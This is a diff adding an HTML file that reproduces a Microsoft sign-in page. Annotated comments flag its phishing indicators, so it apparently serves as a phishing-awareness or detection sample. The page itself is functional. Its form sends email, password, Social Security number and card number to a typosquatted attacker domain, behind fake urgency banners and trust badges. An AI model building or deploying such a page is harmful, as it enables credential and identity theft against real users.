@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <!-- Suspicious: title mimics Microsoft -->
+  <title>Sign in to your Microsoft account</title>
+  <link rel="icon" href="https://www.microsoft.com/favicon.ico" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* Fake Microsoft top bar */
+    .topbar {
+      width: 100%;
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .topbar .ms-logo {
+      display: flex;
+      gap: 2px;
+      margin-right: 8px;
+    }
+
+    .ms-logo .sq { width: 10px; height: 10px; }
+    .sq1 { background: #f25022; }
+    .sq2 { background: #7fba00; }
+    .sq3 { background: #00a4ef; }
+    .sq4 { background: #ffb900; }
+
+    .ms-logo-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2px;
+    }
+
+    .topbar .brand-name {
+      font-size: 16px;
+      color: #1a1a1a;
+      font-weight: 600;
+      letter-spacing: -0.3px;
+    }
+
+    .topbar .secure-badge {
+      margin-left: auto;
+      color: #888;
+      font-size: 12px;
+    }
+
+    /* Urgency warning banner */
+    .warning-banner {
+      width: 100%;
+      background: #fff4ce;
+      border-bottom: 1px solid #f0c000;
+      padding: 9px 20px;
+      font-size: 13px;
+      color: #7a5c00;
+      text-align: center;
+    }
+
+    .container {
+      background: white;
+      margin-top: 36px;
+      padding: 44px 44px 36px;
+      border-radius: 2px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+      width: 100%;
+      max-width: 440px;
+    }
+
+    .ms-logo-large {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 3px;
+      width: 22px;
+      margin-bottom: 20px;
+    }
+
+    .ms-logo-large .sq { width: 10px; height: 10px; }
+
+    .container h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+    }
+
+    .container p.subtitle {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    /* Urgency box */
+    .urgent {
+      background: #fef0f0;
+      border-left: 3px solid #d83b01;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #d83b01;
+      border-radius: 1px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      color: #1a1a1a;
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      padding: 8px 10px;
+      border: 1px solid #888;
+      border-radius: 2px;
+      font-size: 15px;
+      margin-bottom: 16px;
+      outline: none;
+      font-family: inherit;
+      transition: border 0.15s;
+    }
+
+    input:focus { border-color: #0067b8; box-shadow: 0 0 0 1px #0067b8; }
+
+    .btn {
+      width: 100%;
+      padding: 10px;
+      background: #0067b8;
+      color: white;
+      border: none;
+      border-radius: 2px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background 0.15s;
+      margin-top: 4px;
+    }
+
+    .btn:hover { background: #005a9e; }
+
+    .links {
+      font-size: 13px;
+      margin-top: 18px;
+      color: #555;
+    }
+
+    .links a { color: #0067b8; text-decoration: none; }
+    .links a:hover { text-decoration: underline; }
+
+    /* Fake SSL badge */
+    .ssl-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 22px;
+      font-size: 11px;
+      color: #aaa;
+      justify-content: center;
+    }
+
+    .footer {
+      margin-top: 28px;
+      font-size: 11px;
+      color: #aaa;
+      text-align: center;
+      padding-bottom: 40px;
+    }
+
+    .footer a { color: #aaa; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!-- Fake Microsoft top bar -->
+  <div class="topbar">
+    <div class="ms-logo">
+      <div class="ms-logo-grid">
+        <div class="sq sq1"></div>
+        <div class="sq sq2"></div>
+        <div class="sq sq3"></div>
+        <div class="sq sq4"></div>
+      </div>
+    </div>
+    <span class="brand-name">Microsoft</span>
+    <span class="secure-badge">&#128274; Secure Connection</span>
+  </div>
+
+  <!-- Suspicious: urgency/fear banner -->
+  <div class="warning-banner">
+    &#9888;&#65039; Unusual sign-in activity detected. Please verify your account immediately.
+  </div>
+
+  <div class="container">
+
+    <!-- Fake Microsoft logo in card -->
+    <div class="ms-logo-large">
+      <div class="sq sq1"></div>
+      <div class="sq sq2"></div>
+      <div class="sq sq3"></div>
+      <div class="sq sq4"></div>
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to Microsoft account</p>
+
+    <!-- Suspicious: urgency/fear tactic -->
+    <div class="urgent">
+      &#9888; Your account will be locked in <strong>24 hours</strong> due to suspicious activity. Verify now to avoid losing access.
+    </div>
+
+    <!--
+      Suspicious indicators:
+      1. form action points to a different domain
+      2. autocomplete="off"
+      3. Asks for SSN and card number on a login page
+      4. Stolen favicon from microsoft.com
+      5. Typosquat domain implied in form action
+    -->
+    <form action="http://account.nnicrosoft.xyz/collect" method="POST" autocomplete="off">
+
+      <label for="email">Email, phone, or Skype</label>
+      <input type="email" id="email" name="email" placeholder="" required />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="" required />
+
+      <!-- Suspicious: SSN on a login page -->
+      <label for="ssn">
+        Social Security Number
+        <small style="color:#d83b01;font-weight:400;">(required for account recovery)</small>
+      </label>
+      <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" />
+
+      <!-- Suspicious: card number on a login page -->
+      <label for="card">
+        Credit / Debit Card Number
+        <small style="color:#d83b01;font-weight:400;">(required for identity verification)</small>
+      </label>
+      <input type="text" id="card" name="card" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" />
+
+      <button type="submit" class="btn">Sign in</button>
+    </form>
+
+    <div class="links">
+      <a href="#">No account? Create one!</a><br /><br />
+      <a href="#">Forgot password?</a> &nbsp;&middot;&nbsp;
+      <a href="#">Sign-in options</a>
+    </div>
+
+    <!-- Fake trust badge -->
+    <div class="ssl-badge">
+      <span>&#128274;</span>
+      <span>Microsoft Corporation &copy; 2024 | Privacy | Terms of use</span>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    <p>Microsft Accounts Ltd. | One Fake Way, Redmond, WA 00000</p>
+    <p style="margin-top:4px;">
+      <a href="#">Privacy &amp; Cookies</a> &middot;
+      <a href="#">Terms of use</a> &middot;
+      <a href="#">Contact Microsoft</a>
+    </p>
+  </div>
+
+</body>
+</html>
